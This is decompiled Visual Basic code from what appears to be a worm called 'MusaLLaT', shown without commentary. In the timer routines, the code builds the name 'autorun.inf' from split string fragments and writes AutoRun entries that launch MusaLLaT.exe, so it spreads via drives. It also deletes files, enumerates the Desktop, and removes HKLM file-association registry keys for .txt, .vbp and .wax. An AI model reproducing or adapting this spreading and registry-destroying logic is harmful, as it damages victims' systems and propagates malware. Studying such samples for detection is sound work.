  loc_00444F20: call var_80D0 = global_0040102C(00000002h, var_34, var_38)
  loc_00444F29: Exit Sub
  loc_00444F2A: ' Referenced from: 00444EF9
End Sub

Private Sub Timer6_Timer() '449850
  loc_00449856: ext_4010EC
  loc_0044986E: ext_40109C
  loc_004498B5: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_004498C6: call var_8008 = global_00401178(var_60)
  loc_004498E0: call var_800C = global_00401078(var_4C, Form1.Text3)
  loc_004498E6: var_C4 = var_800C
  loc_004498FF: var_34 = var_C4.UnkVCall_000000A0h
  loc_00449907: var_C8 = var_34
  loc_00449914: If var_C8 < 0 Then
  loc_0044992E:   call var_8010 = global_00401058(var_C8, var_C4, global_00418EA4, 000000A0h)
  loc_00449934:   var_FC = var_8010
  loc_0044993C: Else
  loc_00449946: End If
  loc_0044995C: var_78 = var_34
  loc_00449970: call var_8014 = global_004011A4(var_70, var_60, 00000002h)
  loc_0044997E: call var_8018 = global_004010B8(var_70, var_80)
  loc_0044998E: call var_801C = global_004011D4
  loc_004499A2: call var_8020 = global_00401024(00000003h, var_60, var_80, var_70)
  loc_004499B4: If var_8018 Then
  loc_004499C1:   var_98 = global_0041C1B0
  loc_004499DE:   call var_8024 = global_0040118C
  loc_004499EA:   call var_8028 = global_00401120(var_60, 00000000h)
  loc_004499F5:   call var_802C = global_004011AC
  loc_00449A01:   call var_8030 = global_004010B0(global_00418DE4, var_802C)
  loc_00449A0F:   var_B8 = var_8030
  loc_00449A4A:   call var_8034 = global_00401174(var_70, &H800B, var_30, var_C0)
  loc_00449A55:   call var_8038 = global_004010E4(var_80, var_8034)
  loc_00449A5C:   call var_803C = global_00401090(var_8038)
  loc_00449A6C:   call var_8040 = global_004011CC
  loc_00449A7F:   call var_8044 = global_00401024(00000002h, var_60, var_C0)
  loc_00449A91:   If var_803C Then
  loc_00449AA5:     If global_00460558 = 0 Then
  loc_00449AB1:       call var_8048 = global_00401134(global_00418EE0, global_00460558)
  loc_00449AB7:       var_100 = global_00460558
  loc_00449AC3:     Else
  loc_00449ACD:     End If
  loc_00449AD5:     var_C4 = var_100
  loc_00449AEE:     var_4C = var_C4.UnkVCall_00000014h
  loc_00449AF3:     var_C8 = var_4C
  loc_00449B00:     If var_C8 < 0 Then
  loc_00449B17:       call var_804C = global_00401058(var_C8, var_C4, global_00418ED0, 00000014h)
  loc_00449B1D:       var_104 = var_804C
  loc_00449B25:     Else
  loc_00449B2F:     End If
  loc_00449B32:     var_CC = var_4C
  loc_00449B4B:     var_34 = var_CC.UnkVCall_00000050h
  loc_00449B50:     var_D0 = var_34
  loc_00449B5D:     If var_D0 < 0 Then
  loc_00449B74:       call var_8050 = global_00401058(var_D0, var_CC, global_00418EF0, 00000050h)
  loc_00449B7A:       var_108 = var_8050
  loc_00449B82:     Else
  loc_00449B8C:     End If
  loc_00449B93:     If global_00460558 = 0 Then
  loc_00449B9F:       call var_8054 = global_00401134(global_00418EE0, global_00460558)
  loc_00449BA5:       var_10C = global_00460558
  loc_00449BB1:     Else
  loc_00449BBB:     End If
  loc_00449BC3:     var_D4 = var_10C
  loc_00449BDC:     var_50 = var_D4.UnkVCall_00000014h
  loc_00449BE1:     var_D8 = var_50
  loc_00449BEE:     If var_D8 < 0 Then
  loc_00449C05:       call var_8058 = global_00401058(var_D8, var_D4, global_00418ED0, 00000014h)
  loc_00449C0B:       var_110 = var_8058
  loc_00449C13:     Else
  loc_00449C1D:     End If
  loc_00449C20:     var_DC = var_50
  loc_00449C39:     var_38 = var_DC.UnkVCall_00000058h
  loc_00449C3E:     var_E0 = var_38
  loc_00449C4B:     If var_E0 < 0 Then
  loc_00449C62:       call var_805C = global_00401058(var_E0, var_DC, global_00418EF0, 00000058h)
  loc_00449C68:       var_114 = var_805C
  loc_00449C70:     Else
  loc_00449C7A:     End If
  loc_00449C88:     call var_8060 = global_00401044("\", var_34, global_0041C18C)
  loc_00449C93:     call var_8064 = global_004011AC
  loc_00449C9E:     call var_8068 = global_00401044(var_38, var_8064)
  loc_00449CA9:     call var_806C = global_004011AC
  loc_00449CB5:     call var_8070 = global_00401044(".exe", var_806C)
  loc_00449CC0:     call var_8074 = global_004011AC
  loc_00449CC7:     call var_8078 = global_00401158(var_8074)
  loc_00449CE3:     call var_807C = global_00401150(00000005h, var_34, var_3C, var_38, var_40, var_44)
  loc_00449CF6:     call var_8080 = global_0040102C(00000002h, var_4C, var_50)
  loc_00449D10:     call var_8084 = global_00401044("ut", global_0041C17C)
  loc_00449D1B:     call var_8088 = global_004011AC
  loc_00449D27:     call var_808C = global_00401044("or", var_8088)
  loc_00449D32:     call var_8090 = global_004011AC
  loc_00449D3E:     call var_8094 = global_00401044("un.", var_8090)
  loc_00449D49:     call var_8098 = global_004011AC
  loc_00449D55:     call var_809C = global_00401044(global_004193A4, var_8098)
  loc_00449D60:     call var_80A0 = global_004011AC
  loc_00449D6C:     call var_80A4 = global_00401044("nf", var_80A0)
  loc_00449D77:     call var_80A8 = global_004011AC
  loc_00449D82:     call var_80AC = global_00401188(var_48, var_80A8)
  loc_00449D89:     var_80B0 = DeleteFile(var_80AC)
  loc_00449D8E:     call var_80B4 = global_00401054
  loc_00449DAE:     call var_80B8 = global_00401150(00000006h, var_34, var_38, var_3C, var_40, var_44, var_48)
  loc_00449DC8:     call var_80BC = global_00401044("ut", global_0041C17C)
  loc_00449DD3:     call var_80C0 = global_004011AC
  loc_00449DDF:     call var_80C4 = global_00401044("or", var_80C0)
  loc_00449DEA:     call var_80C8 = global_004011AC
  loc_00449DF6:     call var_80CC = global_00401044("un.", var_80C8)
  loc_00449E01:     call var_80D0 = global_004011AC
  loc_00449E0D:     call var_80D4 = global_00401044(global_004193A4, var_80D0)
  loc_00449E18:     call var_80D8 = global_004011AC
  loc_00449E24:     call var_80DC = global_00401044("nf", var_80D8)
  loc_00449E2F:     call var_80E0 = global_004011AC
  loc_00449E3C:     call var_80E4 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_80E0)
  loc_00449E58:     call var_80E8 = global_00401150(00000005h, var_34, var_38, var_3C, var_40, var_44)
  loc_00449E74:     call var_80EC = global_004010F0(global_004194A0, 00000001h, "[AutoRun]")
  loc_00449E90:     call var_80F0 = global_004010F0(global_004194A0, 00000001h, "Open=MusaLLaT.exe")
  loc_00449EAC:     call var_80F4 = global_004010F0(global_004194A0, 00000001h, "Shell\Open=Aç")
  loc_00449EC8:     call var_80F8 = global_004010F0(global_004194A0, 00000001h, "Shell\Open\Command=MusaLLaT.exe")
  loc_00449EDA:     call var_80FC = global_004010A0(00000001h)
  loc_00449EEE:     call var_8100 = global_004011D0(global_0041C18C, 00000006h)
  loc_00449F07:     call var_8104 = global_00401044("ut", global_0041C17C, 00000006h)
  loc_00449F12:     call var_8108 = global_004011AC
  loc_00449F1E:     call var_810C = global_00401044("or", var_8108)
  loc_00449F29:     call var_8110 = global_004011AC
  loc_00449F35:     call var_8114 = global_00401044("un.", var_8110)
  loc_00449F40:     call var_8118 = global_004011AC
  loc_00449F4C:     call var_811C = global_00401044(global_004193A4, var_8118)
  loc_00449F57:     call var_8120 = global_004011AC
  loc_00449F63:     call var_8124 = global_00401044("nf", var_8120)
  loc_00449F6E:     call var_8128 = global_004011AC
  loc_00449F75:     call var_812C = global_004011D0(var_8128)
  loc_00449F91:     call var_8130 = global_00401150(00000005h, var_34, var_38, var_3C, var_40, var_44)
  loc_00449FBE:     call var_8134 = global_00401010
  loc_00449FC4:   End If
  loc_00449FDF:   call var_8138 = global_00401078(var_4C, Form1.Timer8)
  loc_00449FE5:   var_C4 = var_8138
  loc_00449FFC:   var_C4.UnkVCall_0000005Ch
  loc_0044A001:   var_C8 = var_C4.UnkVCall_0000005Ch
  loc_0044A00E:   If var_C8 < 0 Then
  loc_0044A025:     call var_813C = global_00401058(var_C8, var_C4, global_0041925C, 0000005Ch, var_C4, FFFFFFFFh)
  loc_0044A02B:     var_118 = var_813C
  loc_0044A033:   Else
  loc_0044A03D:   End If
  loc_0044A040:   call var_8140 = global_004011D4
  loc_0044A061:   call var_8144 = global_00401078(var_4C, Form1.Timer6)
  loc_0044A067:   var_C4 = var_8144
  loc_0044A07E:   var_C4.UnkVCall_0000005Ch
  loc_0044A083:   var_C8 = var_C4.UnkVCall_0000005Ch
  loc_0044A090:   If var_C8 < 0 Then
  loc_0044A0A7:     call var_8148 = global_00401058(var_C8, var_C4, global_0041925C, 0000005Ch, var_C4, 00000000h)
  loc_0044A0AD:     var_11C = var_8148
  loc_0044A0B5:   Else
  loc_0044A0BF:   End If
  loc_0044A0C2:   call var_814C = global_004011D4
  loc_0044A0C8: End If
  loc_0044A0D4: GoTo loc_0044A12B
  loc_0044A0F0: call var_8150 = global_00401150(00000006h, var_34, var_38, var_3C, var_40, var_44, var_48, global_0044A135)
  loc_0044A103: call var_8154 = global_0040102C(00000002h, var_4C, var_50)
  loc_0044A121: call var_8158 = global_00401024(00000004h, var_60, var_70, var_80, var_90)
  loc_0044A12A: Exit Sub
  loc_0044A12B: ' Referenced from: 0044A0D4
  loc_0044A12E: call var_815C = global_00401014
End Sub

Private Sub Timer5_Timer() '449630
  loc_00449636: ext_4010EC
  loc_0044964E: ext_40109C
  loc_00449695: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_004496AC: call var_8008 = global_00401044("ut", global_0041C17C)
  loc_004496B7: call var_800C = global_004011AC
  loc_004496C3: call var_8010 = global_00401044("or", var_800C)
  loc_004496CE: call var_8014 = global_004011AC
  loc_004496DA: call var_8018 = global_00401044("un.", var_8014)
  loc_004496E5: call var_801C = global_004011AC
  loc_004496F1: call var_8020 = global_00401044(global_004193A4, var_801C)
  loc_004496FC: call var_8024 = global_004011AC
  loc_00449708: call var_8028 = global_00401044("nf", var_8024)
  loc_00449713: call var_802C = global_004011AC
  loc_0044971E: call var_8030 = global_00401188(var_38, var_802C)
  loc_00449725: var_8034 = DeleteFile(var_8030)
  loc_0044972A: call var_8038 = global_00401054
  loc_0044974A: call var_803C = global_00401150(00000006h, var_24, var_28, var_2C, var_30, var_34, var_38)
  loc_00449763: call var_8040 = global_00401188(var_24, global_0041C18C)
  loc_0044976A: var_8044 = DeleteFile(var_8040)
  loc_0044976F: call var_8048 = global_00401054
  loc_00449778: call var_804C = global_004011CC
  loc_00449799: call var_8050 = global_00401078(var_3C, Form1.Timer5)
  loc_0044979F: var_40 = var_8050
  loc_004497AD: var_40.UnkVCall_0000005Ch
  loc_004497B2: var_44 = var_40.UnkVCall_0000005Ch
  loc_004497B9: If var_44 < 0 Then
  loc_004497CA:   call var_8054 = global_00401058(var_44, var_40, global_0041925C, 0000005Ch, var_40, 00000000h)
  loc_004497D0:   var_5C = var_8054
  loc_004497D5: Else
  loc_004497DC: End If
  loc_004497DF: call var_8058 = global_004011D4
  loc_004497F1: GoTo loc_00449820
  loc_0044980D: call var_805C = global_00401150(00000006h, var_24, var_28, var_2C, var_30, var_34, var_38, global_00449821)
  loc_00449819: call var_8060 = global_004011D4
  loc_0044981F: Exit Sub
  loc_00449820: ' Referenced from: 004497F1
End Sub

Private Sub Timer7_Timer() '44A160
  Dim var_8058 As TextBox
  Dim var_8078 As TextBox
  Dim var_8080 As TextBox
  Dim var_80A4 As TextBox
  Dim var_80AC As TextBox
  Dim var_8174 As TextBox
  Dim var_8194 As TextBox
  Dim var_819C As TextBox
  Dim var_81C0 As TextBox
  Dim var_81C8 As TextBox
  loc_0044A166: ext_4010EC
  loc_0044A1DD: call var_8004 = global_00401070(00000001h, Me, 0, 0, 0)
  loc_0044A1E9: If global_00460558 = 0 Then
  loc_0044A1F5:   call var_8008 = global_00401134(global_00418EE0, global_00460558)
  loc_0044A1FB: End If
  loc_0044A208: var_48 = global_00460558.UnkVCall_00000014h
  loc_0044A20F: If var_48 < 0 Then
  loc_0044A220:   call var_800C = global_00401058(var_48, global_00460558, global_00418ED0, 00000014h)
  loc_0044A224: Else
  loc_0044A22A: End If
  loc_0044A234: var_48.UnkVCall_0000007Ch
  loc_0044A23B: If var_48.UnkVCall_0000007Ch < 0 Then
  loc_0044A246:   call var_8010 = global_00401058(var_48.UnkVCall_0000007Ch, var_48, global_00418EF0, 0000007Ch, var_48, 00000000h)
  loc_0044A248: End If
  loc_0044A24B: call var_8014 = global_004011D4
  loc_0044A258: If global_00460558 = 0 Then
  loc_0044A264:   call var_8018 = global_00401134(global_00418EE0, global_00460558)
  loc_0044A26A: End If
  loc_0044A277: var_48 = global_00460558.UnkVCall_00000014h
  loc_0044A27E: If var_48 < 0 Then
  loc_0044A289:   call var_801C = global_00401058(var_48, global_00460558, global_00418ED0, 00000014h)
  loc_0044A28B: End If
  loc_0044A297: var_40 = var_48.UnkVCall_00000050h
  loc_0044A29E: If var_40 < 0 Then
  loc_0044A2A9:   call var_8020 = global_00401058(var_40, var_48, global_00418EF0, 00000050h)
  loc_0044A2AB: End If
  loc_0044A2B4: call var_8024 = global_00401044("\Declare.ini", var_40)
  loc_0044A2BF: call var_8028 = global_004011AC
  loc_0044A2CC: call var_802C = global_0040112C(00000001h, FFFFFFFFh, 00000001h, var_8028)
  loc_0044A2DC: call var_8030 = global_00401150(00000002h, var_40, var_44)
  loc_0044A2E8: call var_8034 = global_004011D4
  loc_0044A2F6: call var_8038 = global_00401138(00000001h)
  loc_0044A301: If var_8038 = 0 Then
  loc_0044A30B:   call var_803C = global_00401030(var_3C, 00000001h)
  loc_0044A311:   var_A4 = global_00418DE4
  loc_0044A330:   call var_8040 = global_00401168(&H8008, var_3C)
  loc_0044A339:   If var_8040 = 0 Then GoTo loc_0044A2F4
  loc_0044A349:   call var_8044 = global_00401078(var_48, Form1.Text1)
  loc_0044A357:   call var_8048 = global_00401118(var_40, var_3C)
  loc_0044A35F:   var_8048 = var_8044.UnkVCall_000000A4h
  loc_0044A369:   If var_8048 < 0 Then
  loc_0044A377:     call var_804C = global_00401058(var_8048, var_8044, global_00418EA4, 000000A4h)
  loc_0044A37D:   End If
  loc_0044A380:   call var_8050 = global_004011CC
  loc_0044A386:   GoTo loc_0044A2E5
  loc_0044A38B: End If
  loc_0044A38B: call var_8054 = global_004010A0
  loc_0044A39F: call var_8058 = var_8044(var_48, Form1.Text1)
  loc_0044A3AA: var_40 = Text1.Text
  loc_0044A3B4: If var_40 < 0 Then
  loc_0044A3C2:   call var_805C = global_00401058(var_40, var_8058, global_00418EA4, 000000A0h)
  loc_0044A3C8: End If
  loc_0044A3E7: call var_8060 = global_004011A4(var_6C, var_5C, 00000002h)
  loc_0044A424: call var_8064 = global_00401180(var_7C, 2, var_6C)
  loc_0044A432: call var_8068 = global_0040105C(var_8C, var_8064)
  loc_0044A440: call var_806C = global_004010B8(&H8002, var_8068)
  loc_0044A450: call var_8070 = global_004011D4
  loc_0044A464: call var_8074 = global_00401024(00000003h, var_5C, var_6C, var_7C)
  loc_0044A475: If var_806C Then
  loc_0044A489:   call var_8078 = var_8044(var_48, Form1.Text1)
  loc_0044A498:   var_40 = Text1.Text
  loc_0044A4A2:   If var_40 < 0 Then
  loc_0044A4B6:     call var_807C = global_00401058(var_40, var_8078, global_00418EA4, 000000A0h)
  loc_0044A4BC:   End If
  loc_0044A4CA:   call var_8080 = var_8044(var_4C, Form1.Text3)
  loc_0044A4CE:   var_B4 = global_0041C1DC
  loc_0044A4F8:   call var_8084 = global_004011A4(var_6C, var_5C, 00000002h)
  loc_0044A52A:   call var_8088 = global_00401180(var_7C, 2, var_6C, 8)
  loc_0044A538:   call var_808C = global_0040111C(var_8C, var_8088)
  loc_0044A543:   call var_8090 = global_00401118(var_44, var_808C)
  loc_0044A54B:   Text3.Text = var_8090
  loc_0044A555:   If var_8090 < 0 Then
  loc_0044A563:     call var_8094 = global_00401058(var_8090, var_8080, global_00418EA4, 000000A4h)
  loc_0044A569:   End If
  loc_0044A56C:   call var_8098 = global_004011CC
  loc_0044A57C:   call var_809C = global_0040102C(00000002h, var_48, var_4C)
  loc_0044A597:   call var_80A0 = global_00401024(00000004h, var_5C, var_6C, var_7C, var_8C)
  loc_0044A5A5: Else
  loc_0044A5B3:   call var_80A4 = var_8080(var_48, Form1.Text1)
  loc_0044A5C2:   var_40 = Text1.Text
  loc_0044A5CC:   If var_40 < 0 Then
  loc_0044A5E0:     call var_80A8 = global_00401058(var_40, var_80A4, global_00418EA4, 000000A0h)
  loc_0044A5E6:   End If
  loc_0044A5F4:   call var_80AC = var_8080(var_4C, Form1.Text3)
  loc_0044A605:   var_5C = var_8080
  loc_0044A612:   call var_80B0 = global_004011A4(var_6C, var_5C, 00000002h)
  loc_0044A63D:   call var_80B4 = global_00401180(var_7C, 2, var_6C)
  loc_0044A648:   call var_80B8 = global_00401118(var_44, var_80B4)
  loc_0044A650:   Text3.Text = var_80B8
  loc_0044A65A:   If var_80B8 < 0 Then
  loc_0044A668:     call var_80BC = global_00401058(var_80B8, var_80AC, global_00418EA4, 000000A4h)
  loc_0044A66E:   End If
  loc_0044A671:   call var_80C0 = global_004011CC
  loc_0044A681:   call var_80C4 = global_0040102C(00000002h, var_48, var_4C)
  loc_0044A695:   call var_80C8 = global_00401024(00000003h, var_5C, var_6C, var_7C)
  loc_0044A69E: End If
  loc_0044A6AC: call var_80CC = global_00401078(var_48, Form1.Timer7)
  loc_0044A6B9: var_80CC.UnkVCall_0000005Ch
  loc_0044A6C0: If var_80CC.UnkVCall_0000005Ch < 0 Then
  loc_0044A6C6:   GoTo loc_0044AD20
  loc_0044A6D2:   If global_00460558 = 0 Then
  loc_0044A6DE:     call var_80D0 = global_00401134(global_00418EE0, global_00460558, var_80CC, 00000000h)
  loc_0044A6E4:   End If
  loc_0044A6F1:   var_48 = global_00460558.UnkVCall_00000014h
  loc_0044A6F8:   If var_48 < 0 Then
  loc_0044A709:     call var_80D4 = global_00401058(var_48, global_00460558, global_00418ED0, 00000014h)
  loc_0044A70D:   Else
  loc_0044A713:   End If
  loc_0044A71D:   var_48.UnkVCall_0000007Ch
  loc_0044A724:   If var_48.UnkVCall_0000007Ch < 0 Then
  loc_0044A72F:     call var_80D8 = global_00401058(var_48.UnkVCall_0000007Ch, var_48, global_00418EF0, 0000007Ch, var_48, 00000000h)
  loc_0044A731:   End If
  loc_0044A734:   call var_80DC = global_004011D4
  loc_0044A741:   If global_00460558 = 0 Then
  loc_0044A74D:     call var_80E0 = global_00401134(global_00418EE0, global_00460558)
  loc_0044A753:   End If
  loc_0044A760:   var_48 = global_00460558.UnkVCall_00000014h
  loc_0044A767:   If var_48 < 0 Then
  loc_0044A772:     call var_80E4 = global_00401058(var_48, global_00460558, global_00418ED0, 00000014h)
  loc_0044A774:   End If
  loc_0044A780:   var_40 = var_48.UnkVCall_00000050h
  loc_0044A787:   If var_40 < 0 Then
  loc_0044A792:     call var_80E8 = global_00401058(var_40, var_48, global_00418EF0, 00000050h)
  loc_0044A794:   End If
  loc_0044A7A3:   call var_80EC = global_00401044("\Declare.ini", var_40)
  loc_0044A7B0:   call var_80F0 = global_004011AC
  loc_0044A7B9:   call var_80F4 = global_0040112C(00000002h, FFFFFFFFh, 00000001h, var_80F0)
  loc_0044A7C9:   call var_80F8 = global_00401150(00000002h, var_40, var_44)
  loc_0044A7D5:   call var_80FC = global_004011D4
  loc_0044A7DF:   call var_8100 = global_00401178(var_5C)
  loc_0044A7F0:   call var_8104 = global_004010F0(global_0041C1E4, 00000001h, var_5C)
  loc_0044A7FC:   call var_8108 = global_00401014
  loc_0044A804:   call var_810C = global_004010A0(00000001h)
  loc_0044A811:   If global_00460558 = 0 Then
  loc_0044A81D:     call var_8110 = global_00401134(global_00418EE0, global_00460558)
  loc_0044A823:   End If
  loc_0044A830:   var_48 = global_00460558.UnkVCall_00000014h
  loc_0044A837:   If var_48 < 0 Then
  loc_0044A842:     call var_8114 = global_00401058(var_48, global_00460558, global_00418ED0, 00000014h)
  loc_0044A848:   End If
  loc_0044A854:   var_40 = var_48.UnkVCall_00000050h
  loc_0044A85B:   If var_40 < 0 Then
  loc_0044A866:     call var_8118 = global_00401058(var_40, var_48, global_00418EF0, 00000050h)
  loc_0044A86C:   End If
  loc_0044A877:   call var_811C = global_00401044("\Declare.ini", var_40, 00000006h)
  loc_0044A87E:   call var_8120 = global_004011AC
  loc_0044A881:   call var_8124 = global_004011D0(var_8120)
  loc_0044A891:   call var_8128 = global_00401150(00000002h, var_40, var_44)
  loc_0044A89D:   call var_812C = global_004011D4
  loc_0044A8AA:   If global_00460558 = 0 Then
  loc_0044A8B6:     call var_8130 = global_00401134(global_00418EE0, global_00460558)
  loc_0044A8BC:   End If
  loc_0044A8C9:   var_48 = global_00460558.UnkVCall_00000014h
  loc_0044A8D0:   If var_48 < 0 Then
  loc_0044A8DB:     call var_8134 = global_00401058(var_48, global_00460558, global_00418ED0, 00000014h)
  loc_0044A8E1:   End If
  loc_0044A8ED:   var_40 = var_48.UnkVCall_00000050h
  loc_0044A8F4:   If var_40 < 0 Then
  loc_0044A8FF:     call var_8138 = global_00401058(var_40, var_48, global_00418EF0, 00000050h)
  loc_0044A905:   End If
  loc_0044A90E:   call var_813C = global_00401044("\Declare.ini", var_40)
  loc_0044A915:   call var_8140 = global_004011AC
  loc_0044A91E:   call var_8144 = global_0040112C(00000001h, FFFFFFFFh, 00000001h, var_8140)
  loc_0044A92E:   call var_8148 = global_00401150(00000002h, var_40, var_44)
  loc_0044A93A:   call var_814C = global_004011D4
  loc_0044A94B:   call var_8150 = global_00401138(00000001h)
  loc_0044A956:   If var_8150 = 0 Then
  loc_0044A960:     call var_8154 = global_00401030(var_2C, 00000001h)
  loc_0044A966:     var_A4 = global_00418DE4
  loc_0044A985:     call var_8158 = global_00401168(&H8008, var_2C)
  loc_0044A98E:     If var_8158 = 0 Then GoTo loc_0044A949
  loc_0044A99E:     call var_815C = global_00401078(var_48, Form1.Text1)
  loc_0044A9AC:     call var_8160 = global_00401118(var_40, var_2C)
  loc_0044A9B4:     var_8160 = var_815C.UnkVCall_000000A4h
  loc_0044A9BE:     If var_8160 < 0 Then
  loc_0044A9CC:       call var_8164 = global_00401058(var_8160, var_815C, global_00418EA4, 000000A4h)
  loc_0044A9D2:     End If
  loc_0044A9D5:     call var_8168 = global_004011CC
  loc_0044A9DE:     call var_816C = global_004011D4
  loc_0044A9E4:     GoTo loc_0044A943
  loc_0044A9E9:   End If
  loc_0044A9E9:   call var_8170 = global_004010A0
  loc_0044A9FD:   call var_8174 = var_815C(var_48, Form1.Text1)
  loc_0044AA08:   var_40 = Text1.Text
  loc_0044AA12:   If var_40 < 0 Then
  loc_0044AA20:     call var_8178 = global_00401058(var_40, var_8174, global_00418EA4, 000000A0h)
  loc_0044AA26:   End If
  loc_0044AA45:   call var_817C = global_004011A4(var_6C, var_5C, 00000002h)
  loc_0044AA82:   call var_8180 = global_00401180(var_7C, 2, var_6C)
  loc_0044AA90:   call var_8184 = global_0040105C(var_8C, var_8180)
  loc_0044AA9E:   call var_8188 = global_004010B8(&H8002, var_8184)
  loc_0044AAAE:   call var_818C = global_004011D4
  loc_0044AAC2:   call var_8190 = global_00401024(00000003h, var_5C, var_6C, var_7C)
  loc_0044AAD3:   If var_8188 Then
  loc_0044AAE7:     call var_8194 = var_815C(var_48, Form1.Text1)
  loc_0044AAF6:     var_40 = Text1.Text
  loc_0044AB00:     If var_40 < 0 Then
  loc_0044AB14:       call var_8198 = global_00401058(var_40, var_8194, global_00418EA4, 000000A0h)
  loc_0044AB1A:     End If
  loc_0044AB28:     call var_819C = var_815C(var_4C, Form1.Text3)
  loc_0044AB2C:     var_B4 = global_0041C1DC
  loc_0044AB56:     call var_81A0 = global_004011A4(var_6C, var_5C, 00000002h)
  loc_0044AB88:     call var_81A4 = global_00401180(var_7C, 2, var_6C, 8)
  loc_0044AB96:     call var_81A8 = global_0040111C(var_8C, var_81A4)
  loc_0044ABA1:     call var_81AC = global_00401118(var_44, var_81A8)
  loc_0044ABA9:     Text3.Text = var_81AC
  loc_0044ABB3:     If var_81AC < 0 Then
  loc_0044ABC1:       call var_81B0 = global_00401058(var_81AC, var_819C, global_00418EA4, 000000A4h)
  loc_0044ABC7:     End If
  loc_0044ABCA:     call var_81B4 = global_004011CC
  loc_0044ABDA:     call var_81B8 = global_0040102C(00000002h, var_48, var_4C)
  loc_0044ABF5:     call var_81BC = global_00401024(00000004h, var_5C, var_6C, var_7C, var_8C)
  loc_0044AC03:   Else
  loc_0044AC11:     call var_81C0 = var_819C(var_48, Form1.Text1)
  loc_0044AC20:     var_40 = Text1.Text
  loc_0044AC2A:     If var_40 < 0 Then
  loc_0044AC3E:       call var_81C4 = global_00401058(var_40, var_81C0, global_00418EA4, 000000A0h)
  loc_0044AC44:     End If
  loc_0044AC52:     call var_81C8 = var_819C(var_4C, Form1.Text3)
  loc_0044AC59:     var_40 = 0
  loc_0044AC60:     var_54 = var_40
  loc_0044AC63:     var_5C = var_819C
  loc_0044AC70:     call var_81CC = global_004011A4(var_6C, var_5C, 00000002h)
  loc_0044AC9B:     call var_81D0 = global_00401180(var_7C, 2, var_6C)
  loc_0044ACA6:     call var_81D4 = global_00401118(var_44, var_81D0)
  loc_0044ACAE:     Text3.Text = var_81D4
  loc_0044ACB8:     If var_81D4 < 0 Then
  loc_0044ACC6:       call var_81D8 = global_00401058(var_81D4, var_81C8, global_00418EA4, 000000A4h)
  loc_0044ACCC:     End If
  loc_0044ACCF:     call var_81DC = global_004011CC
  loc_0044ACDF:     call var_81E0 = global_0040102C(00000002h, var_48, var_4C)
  loc_0044ACF3:     call var_81E4 = global_00401024(00000003h, var_5C, var_6C, var_7C)
  loc_0044ACFC:   End If
  loc_0044AD0A:   call var_81E8 = global_00401078(var_48, Form1.Timer7)
  loc_0044AD17:   var_81E8.UnkVCall_0000005Ch
  loc_0044AD1E:   If var_81E8.UnkVCall_0000005Ch < 0 Then
  loc_0044AD20:     ' Referenced from: 0044A6C6
  loc_0044AD29:     call var_81EC = global_00401058(var_81E8.UnkVCall_0000005Ch, var_81E8, global_0041925C, 0000005Ch, var_81E8, 00000000h)
  loc_0044AD2F:   End If
  loc_0044AD2F: End If
  loc_0044AD32: call var_81F0 = global_004011D4
  loc_0044AD38: call var_81F4 = global_0040106C
  loc_0044AD43: GoTo loc_0044AD8B
  loc_0044AD4F: call var_81F8 = global_00401150(00000002h, var_40, var_44, global_0044AD9C)
  loc_0044AD5F: call var_81FC = global_0040102C(00000002h, var_48, var_4C)
  loc_0044AD81: call var_8200 = global_00401024(00000005h, var_5C, var_6C, var_7C, var_8C, var_9C)
  loc_0044AD8A: Exit Sub
  loc_0044AD8B: ' Referenced from: 0044AD43
  loc_0044AD94: call var_8204 = global_00401014
  loc_0044AD99: call var_8208 = global_00401014
End Sub

Private Sub Timer8_Timer() '44ADC0
  loc_0044ADC6: ext_4010EC
  loc_0044ADDE: ext_40109C
  loc_0044AE25: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_0044AE32: var_5C = "userprofile"
  loc_0044AE46: call var_8008 = global_0040118C
  loc_0044AE54: call var_800C = global_00401064(var_44, var_34)
  loc_0044AE5A: var_6C = "\Desktop\*.*"
  loc_0044AE74: call var_8010 = global_0040111C(var_54, 8, var_44)
  loc_0044AE7B: call var_8014 = global_004010B4(var_8010)
  loc_0044AE8F: call var_8018 = global_00401024(00000003h, var_34, var_44, var_54)
  loc_0044AEA8: call var_801C = global_00401188(var_24, "SOFTWARE\Classes\.text")
  loc_0044AEB4: var_8020 = OnudaSilloA(global_80000002, var_801C)
  loc_0044AEB9: call var_8024 = global_00401054
  loc_0044AEC2: call var_8028 = global_004011CC
  loc_0044AED8: call var_802C = global_00401188(var_24, "SOFTWARE\Classes\.txt\ShellNew")
  loc_0044AEE4: var_8030 = OnudaSilloA(global_80000002, var_802C)
  loc_0044AEE9: call var_8034 = global_00401054
  loc_0044AEF2: call var_8038 = global_004011CC
  loc_0044AF08: call var_803C = global_00401188(var_24, "SOFTWARE\Classes\.txt\PersistentHandler")
  loc_0044AF14: var_8040 = OnudaSilloA(global_80000002, var_803C)
  loc_0044AF19: call var_8044 = global_00401054
  loc_0044AF22: call var_8048 = global_004011CC
  loc_0044AF38: call var_804C = global_00401188(var_24, "SOFTWARE\Classes\.txt")
  loc_0044AF44: var_8050 = OnudaSilloA(global_80000002, var_804C)
  loc_0044AF49: call var_8054 = global_00401054
  loc_0044AF52: call var_8058 = global_004011CC
  loc_0044AF68: call var_805C = global_00401188(var_24, "SOFTWARE\Classes\.vbp")
  loc_0044AF74: var_8060 = OnudaSilloA(global_80000002, var_805C)
  loc_0044AF79: call var_8064 = global_00401054
  loc_0044AF82: call var_8068 = global_004011CC
  loc_0044AF98: call var_806C = global_00401188(var_24, "SOFTWARE\Classes\.wax\PersistentHandler")
  loc_0044AFA4: var_8070 = OnudaSilloA(global_80000002, var_806C)
  loc_0044AFA9: call var_8074 = global_00401054
  loc_0044AFB2: call var_8078 = global_004011CC
  loc_0044AFC8: call var_807C = global_00401188(var_24, "SOFTWARE\Classes\.wax\OpenWithProgIds")
  loc_0044AFD4: var_8080 = OnudaSilloA(global_80000002, var_807C)
  loc_0044AFD9: call var_8084 = global_00401054
  loc_0044AFE2: call var_8088 = global_004011CC
  loc_0044AFF8: call var_808C = global_00401188(var_24, "SOFTWARE\Classes\.wax\OpenWithList\wmplayer.exe")
  loc_0044B004: var_8090 = OnudaSilloA(global_80000002, var_808C)
  loc_0044B009: call var_8094 = global_00401054
  loc_0044B012: call var_8098 = global_004011CC
  loc_0044B028: call var_809C = global_00401188(var_24, "SOFTWARE\Classes\.wax\OpenWithList")
  loc_0044B034: var_80A0 = OnudaSilloA(global_80000002, var_809C)
  loc_0044B039: call var_80A4 = global_00401054
